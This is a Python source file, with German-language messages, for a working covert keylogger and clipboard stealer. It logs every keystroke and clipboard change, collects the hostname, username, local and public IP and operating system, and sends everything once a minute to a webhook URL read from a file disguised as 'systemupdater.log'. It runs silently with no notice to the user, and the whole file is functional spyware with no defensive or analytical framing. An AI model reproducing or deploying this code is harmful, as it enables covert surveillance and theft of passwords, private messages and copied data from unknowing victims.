import requests
from pynput import keyboard
import threading
import time
import socket
import platform
import psutil
import getpass
import pyperclip
import os
import sys
from datetime import datetime, timedelta

def get_active_mac():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
    except:
        return "UNKNOWN"
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and addr.address == local_ip:
                for entry in addrs:
                    if entry.family == psutil.AF_LINK:
                        return entry.address.upper().replace("-", ":")
    return "UNKNOWN"

DEVICE_ID = f"DEVICE-{get_active_mac().replace(':', '')}"

def load_webhook_from_file(filename="systemupdater.log"):
    try:
        exe_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
        full_path = os.path.join(exe_dir, filename)
        with open(full_path, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip().startswith("http"):
                    return line.strip()
    except:
        pass
    return None

WEBHOOK_URL = load_webhook_from_file()
if not WEBHOOK_URL:
    os._exit(0)

log_entries = []
buffer_lock = threading.Lock()
systeminfo_sent = False
held_keys = set()
modifier_keys = {"CTRL", "SHIFT", "ALT", "ALTGR", "WIN"}
last_clipboard = ""

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Unbekannt"

def get_system_info():
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "Unbekannt"
    return (
        f"**Systeminfo für Gerät {DEVICE_ID}**\n"
        f"**Hostname:** `{hostname}`\n"
        f"**Benutzer:** `{getpass.getuser()}`\n"
        f"**Lokale IP:** `{local_ip}`\n"
        f"**Öffentliche IP:** `{get_public_ip()}`\n"
        f"**OS:** `{platform.system()} {platform.release()}`"
    )

def convert_ctrl_char(char):
    code = ord(char)
    return chr(code + 96) if 1 <= code <= 26 else repr(char)

def beautify_key(key):
    mapping = {
        "enter": "ENTER", "space": "SPACE", "tab": "TAB", "backspace": "BACKSPACE",
        "esc": "ESC", "right": "RIGHT", "left": "LEFT", "up": "UP", "down": "DOWN",
        "shift": "SHIFT", "shift_r": "SHIFT", "ctrl_l": "CTRL", "ctrl_r": "CTRL",
        "alt_l": "ALT", "alt_r": "ALT", "alt_gr": "ALTGR", "delete": "DELETE",
        "cmd": "WIN"
    }
    return mapping.get(key, key)

def send_text_in_chunks(text, prefix=""):
    max_length = 1900
    lines = text.splitlines()
    chunk = prefix
    for line in lines:
        if len(chunk) + len(line) + 1 > max_length:
            requests.post(WEBHOOK_URL, json={"content": chunk})
            chunk = prefix + line + "\n"
        else:
            chunk += line + "\n"
    if chunk.strip():
        requests.post(WEBHOOK_URL, json={"content": chunk})

def send_buffer():
    global log_entries, systeminfo_sent
    while True:
        now = datetime.now()
        next_minute = (now + timedelta(minutes=1)).replace(second=0, microsecond=0)
        time.sleep((next_minute - now).total_seconds())
        with buffer_lock:
            if not systeminfo_sent:
                try:
                    requests.post(WEBHOOK_URL, json={"content": get_system_info()})
                    systeminfo_sent = True
                except:
                    pass
            ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            header = f"**Tastenlog {ts}**\n"
            content = "\n".join(log_entries) if log_entries else "_[Keine Eingaben in dieser Minute]_"
            try:
                send_text_in_chunks(content, prefix=header)
            except:
                pass
            log_entries.clear()

def monitor_clipboard():
    global last_clipboard
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clipboard:
                last_clipboard = clip
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                msg = f"**Zwischenablage {ts}:**\n```{clip}```"
                requests.post(WEBHOOK_URL, json={"content": msg})
        except:
            pass
        time.sleep(1)

def on_press(key):
    global held_keys
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if hasattr(key, 'char') and key.char:
            key_str = key.char
            if ord(key_str) < 32:
                key_str = convert_ctrl_char(key_str)
        elif hasattr(key, 'vk'):
            key_str = chr(key.vk) if 32 <= key.vk <= 126 else f"<{key.vk}>"
        else:
            key_str = str(key).replace("Key.", "").lower()
    except:
        return
    key_str = beautify_key(key_str)
    if key_str.upper() in modifier_keys:
        held_keys.add(key_str.upper())
        return
    if "ALTGR" in held_keys:
        held_keys.discard("CTRL")
        held_keys.discard("ALT")
    if key_str.upper() in held_keys:
        return
    mods = sorted(held_keys)
    if hasattr(key, 'char') and key.char and "CTRL" not in mods:
        log_line = f"{ts} | {key.char}"
    elif mods:
        log_line = f"{ts} | {' + '.join(mods + [key_str])}"
    else:
        log_line = f"{ts} | {key_str}"
    with buffer_lock:
        log_entries.append(log_line)

def on_release(key):
    try:
        key_str = str(key).replace("Key.", "").lower()
        key_str = beautify_key(key_str)
        held_keys.discard(key_str.upper())
    except:
        pass

threading.Thread(target=send_buffer, daemon=True).start()
threading.Thread(target=monitor_clipboard, daemon=True).start()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
